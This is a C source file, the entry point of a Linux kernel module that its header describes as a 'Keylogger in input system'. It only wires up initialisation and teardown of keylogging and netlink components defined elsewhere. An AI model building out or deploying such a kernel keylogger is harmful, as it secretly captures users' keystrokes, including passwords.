/*
 * Keylogger in input system
 *
 * Copyright (c) 2010 Xiaochen Wang <wangxiaochen0@gmail.com>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by
 * the Free Software Foundation.
 */
#include <linux/kernel.h>
#include <linux/module.h>
#include "key.h" /* I don't know why it cannot work */

MODULE_LICENSE("GPL");

static int __init ikey_init(void)
{
	if (keylog_init() == 0)
		return nlswitch_init();	
	return -1;
}

static void __exit ikey_exit(void)
{
	nlswitch_exit();
	keylog_exit();
}

module_init(ikey_init);
module_exit(ikey_exit);
